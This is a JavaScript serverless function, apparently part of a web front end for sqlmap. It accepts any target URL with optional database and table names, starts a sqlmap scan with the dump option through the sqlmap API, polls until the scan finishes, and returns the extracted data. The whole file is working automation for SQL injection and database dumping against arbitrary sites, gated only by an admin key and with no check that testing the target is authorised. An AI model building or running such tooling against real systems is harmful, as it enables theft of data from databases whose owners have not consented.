// functions/dump.js
const axios = require("axios");
const { ADMIN_KEY, SQLMAP_API, getHost, short } = require("./_utils.js");

const POLL_INTERVAL = 2000;
const MAX_RUN_MS = 1000 * 60 * 8; // 8 minutes

function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }

exports.handler = async (event) => {
  try {
    const q = event.queryStringParameters || {};
    const providedKey = (event.headers && (event.headers["x-api-key"] || event.headers["X-API-KEY"])) || q.k || "";
    const target = (q.u || q.url || "").trim();
    const db = (q.db || "").trim();
    const table = (q.table || "").trim();
    const mode = (q.mode || "create").trim(); // create or run

    if (!ADMIN_KEY) return { statusCode: 500, body: JSON.stringify({ error: "ADMIN_KEY chưa được cấu hình" }) };
    if (!providedKey || providedKey !== ADMIN_KEY) return { statusCode: 401, body: JSON.stringify({ error: "Unauthorized - missing/invalid API key" }) };
    if (!SQLMAP_API) return { statusCode: 500, body: JSON.stringify({ error: "SQLMAP_API chưa được cấu hình (env)" }) };
    if (!target) return { statusCode: 400, body: JSON.stringify({ error: "Thiếu tham số ?u=<URL>" }) };

    const host = getHost(target);
    if (!host) return { statusCode: 400, body: JSON.stringify({ error: "URL không hợp lệ" }) };

    // 1) create task
    const newTaskRes = await axios.get(`${SQLMAP_API}/task/new`, { timeout: 7000 }).catch(e => ({ data: null, err: e && e.message }));
    const taskid = newTaskRes && newTaskRes.data && newTaskRes.data.taskid;
    if (!taskid) return { statusCode: 502, body: JSON.stringify({ error: "Không tạo được task ở SQLMAP API", raw: short(newTaskRes && newTaskRes.data) }) };

    // 2) start scan with dump options (best-effort)
    const startBody = { url: target, options: { dump: true, D: db || undefined, T: table || undefined } };
    await axios.post(`${SQLMAP_API}/scan/${taskid}/start`, startBody, { timeout: 15000 }).catch(()=>{});

    if (mode === "create") {
      return { statusCode: 200, headers:{ "Content-Type":"application/json" }, body: JSON.stringify({ taskid, mode: "create", note: "Task đã được tạo. Poll /status hoặc gọi /fetch để lấy dữ liệu." }) };
    }

    // mode === "run": poll until finished or timeout
    const deadline = Date.now() + MAX_RUN_MS;
    let lastStatus = null;
    while (Date.now() < deadline) {
      const st = await axios.get(`${SQLMAP_API}/scan/${taskid}/status`, { timeout: 7000 }).catch(()=>null);
      lastStatus = st && st.data ? st.data : null;
      const s = (lastStatus && lastStatus.status ? String(lastStatus.status).toLowerCase() : "");
      if (s === "terminated" || s === "stop" || s === "error") break;
      await sleep(POLL_INTERVAL);
    }

    const dataRes = await axios.get(`${SQLMAP_API}/scan/${taskid}/data`, { timeout: 20000 }).catch(()=>null);
    const logRes = await axios.get(`${SQLMAP_API}/scan/${taskid}/log`, { timeout: 8000 }).catch(()=>null);

    // cleanup: delete task (optional)
    await axios.get(`${SQLMAP_API}/task/${taskid}/delete`).catch(()=>null);

    return {
      statusCode: 200,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        taskid,
        status: lastStatus,
        findings: dataRes && dataRes.data ? dataRes.data : null,
        log: short(logRes && logRes.data)
      })
    };
  } catch (err) {
    return { statusCode: 500, headers: { "Content-Type":"application/json" }, body: JSON.stringify({ error: "Internal error", detail: short(err && err.message) }) };
  }
};
